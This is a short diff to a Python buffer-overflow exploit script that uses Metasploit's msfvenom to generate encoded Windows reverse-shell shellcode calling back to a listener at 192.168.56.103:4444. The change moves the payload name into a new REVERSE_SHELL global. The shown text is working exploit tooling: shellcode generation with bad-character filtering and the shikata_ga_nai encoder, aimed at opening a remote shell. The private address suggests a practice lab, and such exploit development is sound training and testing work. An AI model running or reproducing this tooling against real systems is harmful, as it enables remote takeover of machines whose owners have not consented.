@@ -16,6 +16,7 @@ PATTERN_OFFSET = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.r
 BAD_CHARS = [0x00]
 LHOST = '192.168.56.103'
 LPORT = 4444
+REVERSE_SHELL = 'windows/shell_reverse_tcp'
 # ------------ END GLOBALS ------------
 
 # -------------- EXPLOIT --------------
@@ -221,14 +222,14 @@ class Bof:
         self.port = port
 
     def generateShellcode(self):
-        global LHOST, LPORT, BAD_CHARS
+        global LHOST, LPORT, BAD_CHARS, REVERSE_SHELL
 
         option_bc = ""
         list_chars = ['\\x%0.2X' % e for e in BAD_CHARS]
 
         if len(BAD_CHARS) > 0:
             option_bc = '-b "' + ''.join(list_chars) + '"'
-        cmd = 'msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=%s LPORT=%d -f py -e x86/shikata_ga_nai %s' % (LHOST, LPORT, option_bc)
+        cmd = 'msfvenom -p ' + REVERSE_SHELL + ' EXITFUNC=thread LHOST=%s LPORT=%d -f py -e x86/shikata_ga_nai %s' % (LHOST, LPORT, option_bc)
 
         stdout = runCmd(cmd).decode().split("\n")
 
